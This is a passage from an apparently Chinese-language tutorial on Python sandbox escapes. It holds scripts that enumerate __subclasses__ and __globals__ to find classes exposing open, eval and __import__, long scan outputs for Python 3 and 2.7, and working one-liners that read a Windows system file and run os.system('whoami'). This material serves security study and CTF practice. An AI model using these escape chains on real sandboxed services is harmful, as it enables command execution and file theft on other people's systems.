target_functions = [<span class="hljs-string">'__import__'</span>, <span class="hljs-string">'__builtins__'</span>, <span class="hljs-string">'exec'</span>, <span class="hljs-string">'eval'</span>, <span class="hljs-string">'execfile'</span>, <span class="hljs-string">'compile'</span>, <span class="hljs-string">'file'</span>, <span class="hljs-string">'open'</span>, <span class="hljs-string">'codecs'</span>]
all_targets = target_modules + target_functions
results = defaultdict(<span class="hljs-built_in">list</span>)
<span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> modules:
    <span class="hljs-keyword">try</span>:
        module = <span class="hljs-built_in">__import__</span>(m)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-comment"># print('ERROR:', m)</span>
        <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> all_targets:
        <span class="hljs-keyword">if</span> t <span class="hljs-keyword">in</span> module.__dict__:
            results[m.encode()].append(t)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"可利用模块数量为:"</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(results)))
<span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> results.items():
    <span class="hljs-built_in">print</span>(k, v)</code></pre>
<p>筛选完成后有python3两百个模块可能可以利用，然后再利用脚本进一步筛选</p>
<pre><code class="hljs python">find_modules = {    }
target_modules = [<span class="hljs-string">'os'</span>, <span class="hljs-string">'platform'</span>, <span class="hljs-string">'subprocess'</span>, <span class="hljs-string">'timeit'</span>, <span class="hljs-string">'importlib'</span>, <span class="hljs-string">'codecs'</span>, <span class="hljs-string">'sys'</span>]
target_functions = [<span class="hljs-string">'__import__'</span>, <span class="hljs-string">'__builtins__'</span>, <span class="hljs-string">'exec'</span>, <span class="hljs-string">'eval'</span>, <span class="hljs-string">'execfile'</span>, <span class="hljs-string">'compile'</span>, <span class="hljs-string">'file'</span>, <span class="hljs-string">'open'</span>]
all_targets = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(<span class="hljs-built_in">list</span>(find_modules.keys()) + target_modules + target_functions))
all_modules = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(<span class="hljs-built_in">list</span>(find_modules.keys()) + target_modules))
subclasses = ().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()
sub_name = [s.__name__ <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> subclasses]
<span class="hljs-comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'----------1-----------'</span>)
<span class="hljs-keyword">for</span> i, s <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(sub_name):
    <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> all_targets:
        <span class="hljs-keyword">if</span> f == s:
            <span class="hljs-keyword">if</span> f <span class="hljs-keyword">in</span> target_functions:
                <span class="hljs-built_in">print</span>(i, f)
            <span class="hljs-keyword">elif</span> f <span class="hljs-keyword">in</span> all_modules:
                target = find_modules[f]
                sub_dict = subclasses[i].__dict__
                <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> target:
                    <span class="hljs-keyword">if</span> t <span class="hljs-keyword">in</span> sub_dict:
                        <span class="hljs-built_in">print</span>(i, f, target)
<span class="hljs-built_in">print</span>(<span class="hljs-string">'----------2-----------'</span>)
<span class="hljs-comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')</span>
<span class="hljs-keyword">for</span> i, sub <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(subclasses):
    <span class="hljs-keyword">try</span>:
        more = sub.__init__.__globals__
        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> all_targets:
            <span class="hljs-keyword">if</span> m <span class="hljs-keyword">in</span> more:
                <span class="hljs-built_in">print</span>(i, sub, m, find_modules.get(m))
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">pass</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'----------3-----------'</span>)
<span class="hljs-comment"># 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__("os").system("ls")')</span>
<span class="hljs-keyword">for</span> i, sub <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(subclasses):
    <span class="hljs-keyword">try</span>:
        more = sub.__init__.__globals__.values()
        <span class="hljs-keyword">for</span> j, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(more):
            <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> all_targets:
                <span class="hljs-keyword">try</span>:
                    <span class="hljs-keyword">if</span> f <span class="hljs-keyword">in</span> v:
                        <span class="hljs-keyword">if</span> f <span class="hljs-keyword">in</span> target_functions:
                            <span class="hljs-built_in">print</span>(i, j, sub, f)
                        <span class="hljs-keyword">elif</span> f <span class="hljs-keyword">in</span> all_modules:
                            target = find_modules.get(f)
                            sub_dict = v[f].__dict__
                            <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> target:
                                <span class="hljs-keyword">if</span> t <span class="hljs-keyword">in</span> sub_dict:
                                    <span class="hljs-built_in">print</span>(i, j, sub, f, target)
                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                    <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">pass</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'----------4-----------'</span>)
<span class="hljs-comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")</span>
<span class="hljs-comment"># &lt;class 'warnings.catch_warnings'&gt;类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似</span>
<span class="hljs-keyword">for</span> i, sub <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(subclasses):
    <span class="hljs-keyword">try</span>:
        more = sub()._module.__builtins__
        <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> all_targets:
            <span class="hljs-keyword">if</span> f <span class="hljs-keyword">in</span> more:
                <span class="hljs-built_in">print</span>(i, f)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">pass</span></code></pre>
<pre><code class="hljs plaintext">----------2-----------
75 &lt;class '_frozen_importlib._ModuleLock'&gt; __builtins__ None
75 &lt;class '_frozen_importlib._ModuleLock'&gt; __import__ None
75 &lt;class '_frozen_importlib._ModuleLock'&gt; sys None
76 &lt;class '_frozen_importlib._DummyModuleLock'&gt; __builtins__ None
76 &lt;class '_frozen_importlib._DummyModuleLock'&gt; __import__ None
76 &lt;class '_frozen_importlib._DummyModuleLock'&gt; sys None
77 &lt;class '_frozen_importlib._ModuleLockManager'&gt; __builtins__ None
77 &lt;class '_frozen_importlib._ModuleLockManager'&gt; __import__ None
77 &lt;class '_frozen_importlib._ModuleLockManager'&gt; sys None
78 &lt;class '_frozen_importlib._installed_safely'&gt; __builtins__ None
78 &lt;class '_frozen_importlib._installed_safely'&gt; __import__ None
78 &lt;class '_frozen_importlib._installed_safely'&gt; sys None
79 &lt;class '_frozen_importlib.ModuleSpec'&gt; __builtins__ None
79 &lt;class '_frozen_importlib.ModuleSpec'&gt; __import__ None
79 &lt;class '_frozen_importlib.ModuleSpec'&gt; sys None
91 &lt;class '_frozen_importlib_external.FileLoader'&gt; __builtins__ None
91 &lt;class '_frozen_importlib_external.FileLoader'&gt; sys None
92 &lt;class '_frozen_importlib_external._NamespacePath'&gt; __builtins__ None
92 &lt;class '_frozen_importlib_external._NamespacePath'&gt; sys None
93 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; __builtins__ None
93 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; sys None
95 &lt;class '_frozen_importlib_external.FileFinder'&gt; __builtins__ None
95 &lt;class '_frozen_importlib_external.FileFinder'&gt; sys None
103 &lt;class 'codecs.IncrementalEncoder'&gt; __builtins__ None
103 &lt;class 'codecs.IncrementalEncoder'&gt; sys None
103 &lt;class 'codecs.IncrementalEncoder'&gt; open None
104 &lt;class 'codecs.IncrementalDecoder'&gt; __builtins__ None
104 &lt;class 'codecs.IncrementalDecoder'&gt; sys None
104 &lt;class 'codecs.IncrementalDecoder'&gt; open None
105 &lt;class 'codecs.StreamReaderWriter'&gt; __builtins__ None
105 &lt;class 'codecs.StreamReaderWriter'&gt; sys None
105 &lt;class 'codecs.StreamReaderWriter'&gt; open None
106 &lt;class 'codecs.StreamRecoder'&gt; __builtins__ None
106 &lt;class 'codecs.StreamRecoder'&gt; sys None
106 &lt;class 'codecs.StreamRecoder'&gt; open None
128 &lt;class 'os._wrap_close'&gt; __builtins__ None
128 &lt;class 'os._wrap_close'&gt; sys None
128 &lt;class 'os._wrap_close'&gt; open None
129 &lt;class '_sitebuiltins.Quitter'&gt; __builtins__ None
129 &lt;class '_sitebuiltins.Quitter'&gt; sys None
130 &lt;class '_sitebuiltins._Printer'&gt; __builtins__ None
130 &lt;class '_sitebuiltins._Printer'&gt; sys None
137 &lt;class 'types.DynamicClassAttribute'&gt; __builtins__ None
138 &lt;class 'types._GeneratorWrapper'&gt; __builtins__ None
139 &lt;class 'warnings.WarningMessage'&gt; __builtins__ None
139 &lt;class 'warnings.WarningMessage'&gt; sys None
140 &lt;class 'warnings.catch_warnings'&gt; __builtins__ None
140 &lt;class 'warnings.catch_warnings'&gt; sys None
167 &lt;class 'reprlib.Repr'&gt; __builtins__ None
174 &lt;class 'functools.partialmethod'&gt; __builtins__ None
176 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; __builtins__ None
176 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; sys None
177 &lt;class 'contextlib._BaseExitStack'&gt; __builtins__ None
177 &lt;class 'contextlib._BaseExitStack'&gt; sys None
----------3-----------
75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; exec
75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; eval
75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; compile
75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; __import__
75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; open
76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; exec
76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; eval
76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; compile
76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; __import__
76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; open
77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; exec
77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; eval
77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; compile
77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; __import__
77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; open
78 5 &lt;class '_frozen_importlib._installed_safely'&gt; exec
78 5 &lt;class '_frozen_importlib._installed_safely'&gt; eval
78 5 &lt;class '_frozen_importlib._installed_safely'&gt; compile
78 5 &lt;class '_frozen_importlib._installed_safely'&gt; __import__
78 5 &lt;class '_frozen_importlib._installed_safely'&gt; open
79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; exec
79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; eval
79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; compile
79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; __import__
79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; open
91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; exec
91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; eval
91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; compile
91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; __import__
91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; open
92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; exec
92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; eval
92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; compile
92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; __import__
92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; open
93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; exec
93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; eval
93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; compile
93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; __import__
93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; open
95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; exec
95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; eval
95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; compile
95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; __import__
95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; open
103 7 &lt;class 'codecs.IncrementalEncoder'&gt; exec
103 7 &lt;class 'codecs.IncrementalEncoder'&gt; eval
103 7 &lt;class 'codecs.IncrementalEncoder'&gt; compile
103 7 &lt;class 'codecs.IncrementalEncoder'&gt; __import__
103 7 &lt;class 'codecs.IncrementalEncoder'&gt; open
103 56 &lt;class 'codecs.IncrementalEncoder'&gt; open
104 7 &lt;class 'codecs.IncrementalDecoder'&gt; exec
104 7 &lt;class 'codecs.IncrementalDecoder'&gt; eval
104 7 &lt;class 'codecs.IncrementalDecoder'&gt; compile
104 7 &lt;class 'codecs.IncrementalDecoder'&gt; __import__
104 7 &lt;class 'codecs.IncrementalDecoder'&gt; open
104 56 &lt;class 'codecs.IncrementalDecoder'&gt; open
105 7 &lt;class 'codecs.StreamReaderWriter'&gt; exec
105 7 &lt;class 'codecs.StreamReaderWriter'&gt; eval
105 7 &lt;class 'codecs.StreamReaderWriter'&gt; compile
105 7 &lt;class 'codecs.StreamReaderWriter'&gt; __import__
105 7 &lt;class 'codecs.StreamReaderWriter'&gt; open
105 56 &lt;class 'codecs.StreamReaderWriter'&gt; open
106 7 &lt;class 'codecs.StreamRecoder'&gt; exec
106 7 &lt;class 'codecs.StreamRecoder'&gt; eval
106 7 &lt;class 'codecs.StreamRecoder'&gt; compile
106 7 &lt;class 'codecs.StreamRecoder'&gt; __import__
106 7 &lt;class 'codecs.StreamRecoder'&gt; open
106 56 &lt;class 'codecs.StreamRecoder'&gt; open
128 1 &lt;class 'os._wrap_close'&gt; exec
128 1 &lt;class 'os._wrap_close'&gt; file
128 1 &lt;class 'os._wrap_close'&gt; open
128 7 &lt;class 'os._wrap_close'&gt; exec
128 7 &lt;class 'os._wrap_close'&gt; eval
128 7 &lt;class 'os._wrap_close'&gt; compile
128 7 &lt;class 'os._wrap_close'&gt; __import__
128 7 &lt;class 'os._wrap_close'&gt; open
128 11 &lt;class 'os._wrap_close'&gt; open
129 7 &lt;class '_sitebuiltins.Quitter'&gt; exec
129 7 &lt;class '_sitebuiltins.Quitter'&gt; eval
129 7 &lt;class '_sitebuiltins.Quitter'&gt; compile
129 7 &lt;class '_sitebuiltins.Quitter'&gt; __import__
129 7 &lt;class '_sitebuiltins.Quitter'&gt; open
130 7 &lt;class '_sitebuiltins._Printer'&gt; exec
130 7 &lt;class '_sitebuiltins._Printer'&gt; eval
130 7 &lt;class '_sitebuiltins._Printer'&gt; compile
130 7 &lt;class '_sitebuiltins._Printer'&gt; __import__
130 7 &lt;class '_sitebuiltins._Printer'&gt; open
137 7 &lt;class 'types.DynamicClassAttribute'&gt; exec
137 7 &lt;class 'types.DynamicClassAttribute'&gt; eval
137 7 &lt;class 'types.DynamicClassAttribute'&gt; compile
137 7 &lt;class 'types.DynamicClassAttribute'&gt; __import__
137 7 &lt;class 'types.DynamicClassAttribute'&gt; open
138 7 &lt;class 'types._GeneratorWrapper'&gt; exec
138 7 &lt;class 'types._GeneratorWrapper'&gt; eval
138 7 &lt;class 'types._GeneratorWrapper'&gt; compile
138 7 &lt;class 'types._GeneratorWrapper'&gt; __import__
138 7 &lt;class 'types._GeneratorWrapper'&gt; open
139 7 &lt;class 'warnings.WarningMessage'&gt; exec
139 7 &lt;class 'warnings.WarningMessage'&gt; eval
139 7 &lt;class 'warnings.WarningMessage'&gt; compile
139 7 &lt;class 'warnings.WarningMessage'&gt; __import__
139 7 &lt;class 'warnings.WarningMessage'&gt; open
140 7 &lt;class 'warnings.catch_warnings'&gt; exec
140 7 &lt;class 'warnings.catch_warnings'&gt; eval
140 7 &lt;class 'warnings.catch_warnings'&gt; compile
140 7 &lt;class 'warnings.catch_warnings'&gt; __import__
140 7 &lt;class 'warnings.catch_warnings'&gt; open
167 7 &lt;class 'reprlib.Repr'&gt; exec
167 7 &lt;class 'reprlib.Repr'&gt; eval
167 7 &lt;class 'reprlib.Repr'&gt; compile
167 7 &lt;class 'reprlib.Repr'&gt; __import__
167 7 &lt;class 'reprlib.Repr'&gt; open
174 7 &lt;class 'functools.partialmethod'&gt; exec
174 7 &lt;class 'functools.partialmethod'&gt; eval
174 7 &lt;class 'functools.partialmethod'&gt; compile
174 7 &lt;class 'functools.partialmethod'&gt; __import__
174 7 &lt;class 'functools.partialmethod'&gt; open
176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; exec
176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; eval
176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; compile
176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; __import__
176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; open
177 7 &lt;class 'contextlib._BaseExitStack'&gt; exec
177 7 &lt;class 'contextlib._BaseExitStack'&gt; eval
177 7 &lt;class 'contextlib._BaseExitStack'&gt; compile
177 7 &lt;class 'contextlib._BaseExitStack'&gt; __import__
177 7 &lt;class 'contextlib._BaseExitStack'&gt; open
----------4-----------
140 exec
140 eval
140 compile
140 __import__
140 open</code></pre>
<p>筛选出来的模块还是很多，每个分块中，不用的部分代表利用不同的方式，为了更方便的利用进一步筛选具有更直接利用方式的类，关注再命令执行和读写上</p>
<pre><code class="hljs plaintext">----------2-----------                                      
103 &lt;class 'codecs.IncrementalEncoder'&gt; open None           
104 &lt;class 'codecs.IncrementalDecoder'&gt; open None           
105 &lt;class 'codecs.StreamReaderWriter'&gt; open None           
106 &lt;class 'codecs.StreamRecoder'&gt; open None                
128 &lt;class 'os._wrap_close'&gt; open None                      
----------3-----------                                      
75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; open           
75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; exec           
76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; open      
76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; exec      
77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; open    
77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; exec    
78 5 &lt;class '_frozen_importlib._installed_safely'&gt; open     
78 5 &lt;class '_frozen_importlib._installed_safely'&gt; exec     
79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; open            
79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; exec            
91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; open   
91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; exec   
92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; open
92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; exec
93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; open
93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; exec
95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; open   
95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; exec   
103 7 &lt;class 'codecs.IncrementalEncoder'&gt; open              
103 7 &lt;class 'codecs.IncrementalEncoder'&gt; exec              
103 56 &lt;class 'codecs.IncrementalEncoder'&gt; open             
104 7 &lt;class 'codecs.IncrementalDecoder'&gt; open              
104 7 &lt;class 'codecs.IncrementalDecoder'&gt; exec              
104 56 &lt;class 'codecs.IncrementalDecoder'&gt; open             
105 7 &lt;class 'codecs.StreamReaderWriter'&gt; open              
105 7 &lt;class 'codecs.StreamReaderWriter'&gt; exec              
105 56 &lt;class 'codecs.StreamReaderWriter'&gt; open             
106 7 &lt;class 'codecs.StreamRecoder'&gt; open                   
106 7 &lt;class 'codecs.StreamRecoder'&gt; exec                   
106 56 &lt;class 'codecs.StreamRecoder'&gt; open                  
128 1 &lt;class 'os._wrap_close'&gt; open                         
128 1 &lt;class 'os._wrap_close'&gt; exec                         
128 7 &lt;class 'os._wrap_close'&gt; open                         
128 7 &lt;class 'os._wrap_close'&gt; exec                         
128 11 &lt;class 'os._wrap_close'&gt; open                        
129 7 &lt;class '_sitebuiltins.Quitter'&gt; open                  
129 7 &lt;class '_sitebuiltins.Quitter'&gt; exec                  
130 7 &lt;class '_sitebuiltins._Printer'&gt; open                 
130 7 &lt;class '_sitebuiltins._Printer'&gt; exec                 
137 7 &lt;class 'types.DynamicClassAttribute'&gt; open            
137 7 &lt;class 'types.DynamicClassAttribute'&gt; exec            
138 7 &lt;class 'types._GeneratorWrapper'&gt; open                
138 7 &lt;class 'types._GeneratorWrapper'&gt; exec                
139 7 &lt;class 'warnings.WarningMessage'&gt; open                
139 7 &lt;class 'warnings.WarningMessage'&gt; exec                
140 7 &lt;class 'warnings.catch_warnings'&gt; open                
140 7 &lt;class 'warnings.catch_warnings'&gt; exec                
167 7 &lt;class 'reprlib.Repr'&gt; open                           
167 7 &lt;class 'reprlib.Repr'&gt; exec                           
174 7 &lt;class 'functools.partialmethod'&gt; open                
174 7 &lt;class 'functools.partialmethod'&gt; exec                
176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; open
176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; exec
177 7 &lt;class 'contextlib._BaseExitStack'&gt; open              
177 7 &lt;class 'contextlib._BaseExitStack'&gt; exec              
----------4-----------                                      
140 open                                                    
140 exec</code></pre>
<p>既然筛选出来，那么选其中一个利用来读取文件：</p>
<pre><code class="hljs plaintext">&gt;&gt;&gt; "".__class__.__bases__[0].__subclasses__()[103]
&lt;class 'codecs.IncrementalEncoder'&gt;</code></pre>
<p>完整执行</p>
<pre><code class="hljs plaintext">&gt;&gt;&gt; "".__class__.__bases__[0].__subclasses__()[103].__init__.__globals__['open']("C:\\windows\\win.ini").read()
'; for 16-bit app support\n[fonts]\n[extensions]\n[mciextensions]\n[files]\n[Mail]\nMAPI=1\nCMCDLLNAME32=mapi32.dll\nCM
C=1\nMAPIX=1\nMAPIXVER=1.0.0.1\nOLEMessaging=1\n[xianshuabao]\nclient_uuid={xxx}\n'</code></pre>
<p>执行命令，此处如果使用原作者给的第三种利用代码在python3中会报错，python3中对于<code>dict.values</code>不再返回列表，而是返回view，不可索引的对象。</p>
<pre><code class="hljs none">&gt;&gt;&gt; "".__class__.__bases__[0].__subclasses__()[103].__init__.__globals__['__builtins__']['eval']('__import__("os").system("whoami")')
misaki\user</code></pre>
<h5 id="52-python2">5.2 python2</h5>
<p>python2.7的模块(252)</p>
<pre><code class="hljs plaintext">bsddb
compiler
ctypes
curses
......
webbrowser.py
whichdb.py
wsgiref.egg-info
xdrlib.py
xmllib.py
xmlrpclib.py
zipfile.py</code></pre>
<p>同样利用原代码进行筛选</p>
<pre><code class="hljs plaintext">----------1-----------
(40, 'file')
----------2-----------
(59, &lt;class 'warnings.WarningMessage'&gt;, 'linecache', ['os', 'sys', '__builtins__'])
(59, &lt;class 'warnings.WarningMessage'&gt;, '__builtins__', None)
(59, &lt;class 'warnings.WarningMessage'&gt;, 'sys', None)
(59, &lt;class 'warnings.WarningMessage'&gt;, 'types', ['__builtins__'])
(60, &lt;class 'warnings.catch_warnings'&gt;, 'linecache', ['os', 'sys', '__builtins__'])
(60, &lt;class 'warnings.catch_warnings'&gt;, '__builtins__', None)
(60, &lt;class 'warnings.catch_warnings'&gt;, 'sys', None)
(60, &lt;class 'warnings.catch_warnings'&gt;, 'types', ['__builtins__'])
(61, &lt;class '_weakrefset._IterationGuard'&gt;, '__builtins__', None)
(62, &lt;class '_weakrefset.WeakSet'&gt;, '__builtins__', None)
(72, &lt;class 'site._Printer'&gt;, '__builtins__', None)
(72, &lt;class 'site._Printer'&gt;, 'traceback', ['sys', '__builtins__'])
(72, &lt;class 'site._Printer'&gt;, 'os', ['sys', '__builtins__', 'open'])
(72, &lt;class 'site._Printer'&gt;, 'sys', None)
(77, &lt;class 'site.Quitter'&gt;, '__builtins__', None)
(77, &lt;class 'site.Quitter'&gt;, 'traceback', ['sys', '__builtins__'])
(77, &lt;class 'site.Quitter'&gt;, 'os', ['sys', '__builtins__', 'open'])
(77, &lt;class 'site.Quitter'&gt;, 'sys', None)
(78, &lt;class 'codecs.IncrementalEncoder'&gt;, '__builtins__', None)
(78, &lt;class 'codecs.IncrementalEncoder'&gt;, 'sys', None)
(78, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open', None)
(79, &lt;class 'codecs.IncrementalDecoder'&gt;, '__builtins__', None)
(79, &lt;class 'codecs.IncrementalDecoder'&gt;, 'sys', None)
(79, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open', None)
----------3-----------
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, '__import__')
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'file')
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'compile')
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'eval')
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'open')
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'execfile')
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, '__import__')
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'file')
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'compile')
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'eval')
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'open')
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'execfile')
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, '__import__')
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'file')
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'compile')
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'eval')
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'open')
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'execfile')
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, '__import__')
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'file')
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'compile')
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'eval')
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'open')
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'execfile')
(72, 20, &lt;class 'site._Printer'&gt;, 'file')
(72, 20, &lt;class 'site._Printer'&gt;, 'exec')
(72, 23, &lt;class 'site._Printer'&gt;, '__import__')
(72, 23, &lt;class 'site._Printer'&gt;, 'file')
(72, 23, &lt;class 'site._Printer'&gt;, 'compile')
(72, 23, &lt;class 'site._Printer'&gt;, 'eval')
(72, 23, &lt;class 'site._Printer'&gt;, 'open')
(72, 23, &lt;class 'site._Printer'&gt;, 'execfile')
(77, 20, &lt;class 'site.Quitter'&gt;, 'file')
(77, 20, &lt;class 'site.Quitter'&gt;, 'exec')
(77, 23, &lt;class 'site.Quitter'&gt;, '__import__')
(77, 23, &lt;class 'site.Quitter'&gt;, 'file')
(77, 23, &lt;class 'site.Quitter'&gt;, 'compile')
(77, 23, &lt;class 'site.Quitter'&gt;, 'eval')
(77, 23, &lt;class 'site.Quitter'&gt;, 'open')
(77, 23, &lt;class 'site.Quitter'&gt;, 'execfile')
(78, 21, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open')
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, '__import__')
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'file')
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'compile')
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'eval')
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open')
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'execfile')
(79, 21, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open')
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, '__import__')
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'file')
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'compile')
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'eval')
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open')
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'execfile')
----------4-----------
(60, '__import__')
(60, 'file')
(60, 'repr')
(60, 'compile')
(60, 'eval')
(60, 'open')
(60, 'execfile')</code></pre>
<p>进一步获取可以直接执行命令或者读取文件的类</p>
<pre><code class="hljs plaintext">----------1-----------                                                                
(40, 'file')                                                                          
----------2-----------                                                                
(59, &lt;class 'warnings.WarningMessage'&gt;, 'linecache', ['os', 'sys', '__builtins__'])   
(59, &lt;class 'warnings.WarningMessage'&gt;, 'types', ['__builtins__'])                    
